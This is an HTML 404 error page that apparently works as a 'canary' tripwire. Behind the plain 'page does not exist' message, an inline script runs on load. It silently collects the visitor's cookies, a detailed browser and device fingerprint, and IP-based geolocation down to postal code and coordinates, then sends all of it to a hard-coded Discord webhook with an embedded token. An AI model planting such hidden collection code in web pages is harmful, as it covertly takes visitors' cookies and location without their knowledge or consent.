<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>404 &mdash; Not Found</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            background: #090909;
            color: #c9c9c9;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .wrap {
            text-align: center;
            padding: 2rem;
        }
        h1 {
            font-size: clamp(4rem, 18vw, 9rem);
            margin: 0;
            letter-spacing: -0.04em;
            color: #e6e6e6;
        }
        p {
            margin: 0.5rem 0 0;
            color: #777;
            font-size: 1rem;
        }
        a {
            color: #0066cc;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="wrap">
        <h1>404</h1>
        <p>The page you are looking for does not exist.</p>
        <p><a href="/tabs/about.html">Return home</a></p>
    </div>

    <script>
    (function () {
        const WEBHOOK = "https://discord.com/api/webhooks/1549237767643603036/YQbEmlTMv8QPYVhY9YnGFKdaKgHcPODxVuQe4b1pGqtU6oPIS8bPSF0C4kvuMo5XzyIN";

        const nav = window.navigator;
        const screen = window.screen;
        const perf = window.performance && window.performance.timing
            ? window.performance.timing
            : null;

        const fields = {
            url: window.location.href,
            path: window.location.pathname,
            search: window.location.search,
            hash: window.location.hash,
            referrer: document.referrer || "(none)",
            origin: window.location.origin,
            userAgent: nav.userAgent,
            appVersion: nav.appVersion,
            appName: nav.appName,
            appCodeName: nav.appCodeName,
            platform: nav.platform,
            vendor: nav.vendor,
            vendorSub: nav.vendorSub,
            product: nav.product,
            productSub: nav.productSub,
            language: nav.language,
            languages: (nav.languages || []).join(","),
            cookieEnabled: nav.cookieEnabled,
            doNotTrack: nav.doNotTrack,
            onLine: nav.onLine,
            hardwareConcurrency: nav.hardwareConcurrency,
            deviceMemory: nav.deviceMemory,
            maxTouchPoints: nav.maxTouchPoints,
            pdfViewerEnabled: nav.pdfViewerEnabled,
            webdriver: nav.webdriver,
            connection: nav.connection
                ? {
                    effectiveType: nav.connection.effectiveType,
                    downlink: nav.connection.downlink,
                    rtt: nav.connection.rtt,
                    saveData: nav.connection.saveData
                }
                : "(unavailable)",
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: (screen.orientation && screen.orientation.type) || "(none)"
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio,
                scrollX: window.scrollX,
                scrollY: window.scrollY
            },
            timezone: {
                offset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            },
            storage: {
                localStorage: (() => {
                    try { return !!window.localStorage; } catch (e) { return false; }
                })(),
                sessionStorage: (() => {
                    try { return !!window.sessionStorage; } catch (e) { return false; }
                })(),
                indexedDB: !!window.indexedDB
            },
            cookies: document.cookie || "(none)",
            performance: perf
                ? {
                    navigationStart: perf.navigationStart,
                    loadEventEnd: perf.loadEventEnd,
                    domComplete: perf.domComplete,
                    responseEnd: perf.responseEnd
                }
                : "(unavailable)",
            hitTime: new Date().toISOString()
        };

        const send = (extra) => {
            const payload = Object.assign({}, fields, extra || {});
            const body = {
                username: "jfs-canary",
                embeds: [{
                    title: "Canary tripped: " + (payload.url || "(unknown url)"),
                    color: 0xcc3333,
                    timestamp: payload.hitTime,
                    fields: Object.keys(payload)
                        .filter((k) => payload[k] !== undefined && payload[k] !== null)
                        .map((k) => {
                            let value = payload[k];
                            if (typeof value === "object")
                                value = JSON.stringify(value, null, 2);
                            else
                                value = String(value);
                            if (value.length > 1000)
                                value = value.slice(0, 1000) + "\u2026";
                            return { name: k, value: value, inline: false };
                        })
                }]
            };

            const req = new XMLHttpRequest();
            req.open("POST", WEBHOOK, true);
            req.setRequestHeader("Content-Type", "application/json");
            req.send(JSON.stringify(body));
        };

        const enrichWithGeo = () => {
            fetch("https://ipapi.co/json/")
                .then((res) => res.json())
                .then((geo) => {
                    send({
                        geo: {
                            ip: geo.ip,
                            city: geo.city,
                            region: geo.region,
                            country: geo.country,
                            countryName: geo.country_name,
                            postal: geo.postal,
                            latitude: geo.latitude,
                            longitude: geo.longitude,
                            org: geo.org,
                            asn: geo.asn,
                            timezone: geo.timezone
                        }
                    });
                })
                .catch(() => send({ geo: "(lookup failed)" }));
        };

        try {
            enrichWithGeo();
        } catch (e) {
            send({ geo: "(lookup threw: " + e + ")" });
        }
    })();
    </script>
</body>
</html>
